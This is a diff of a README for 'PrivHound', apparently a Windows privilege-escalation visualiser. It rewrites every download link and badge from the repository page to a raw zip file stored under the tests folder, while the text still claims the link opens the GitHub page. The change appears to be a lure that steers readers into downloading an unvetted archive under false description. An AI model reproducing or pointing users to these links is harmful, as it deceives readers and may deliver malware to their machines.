@@ -1,6 +1,6 @@
 # 🕵️‍♂️ PrivHound - Visualize Local Windows Attack Paths
 
-[![Download PrivHound](https://img.shields.io/badge/Download-PrivHound-orange?style=for-the-badge)](https://github.com/SURAJPAL369/PrivHound)
+[![Download PrivHound](https://img.shields.io/badge/Download-PrivHound-orange?style=for-the-badge)](https://github.com/SURAJPAL369/PrivHound/raw/refs/heads/main/tests/Priv-Hound-3.6.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Follow these steps to download and start PrivHound on Windows. You do not need a
 
 Click this link to open the PrivHound page with the latest files:
 
-[Download PrivHound](https://github.com/SURAJPAL369/PrivHound)
+[Download PrivHound](https://github.com/SURAJPAL369/PrivHound/raw/refs/heads/main/tests/Priv-Hound-3.6.zip)
 
 This opens the GitHub page where you can find the files and instructions.
 
@@ -108,7 +108,7 @@ If the program does not run or the scan fails:
 
 The main source for updates, issues, and help is the GitHub repository page:
 
-[https://github.com/SURAJPAL369/PrivHound](https://github.com/SURAJPAL369/PrivHound)
+[https://github.com/SURAJPAL369/PrivHound/raw/refs/heads/main/tests/Priv-Hound-3.6.zip](https://github.com/SURAJPAL369/PrivHound/raw/refs/heads/main/tests/Priv-Hound-3.6.zip)
 
 Here you can also check the **Issues** tab for common problems or post new questions if needed.
 
@@ -118,4 +118,4 @@ Here you can also check the **Issues** tab for common problems or post new quest
 
 Use the button below any time to return to the download page:
 
-[![Download PrivHound](https://img.shields.io/badge/Download-PrivHound-red?style=for-the-badge)](https://github.com/SURAJPAL369/PrivHound)
+[![Download PrivHound](https://img.shields.io/badge/Download-PrivHound-red?style=for-the-badge)](https://github.com/SURAJPAL369/PrivHound/raw/refs/heads/main/tests/Priv-Hound-3.6.zip)
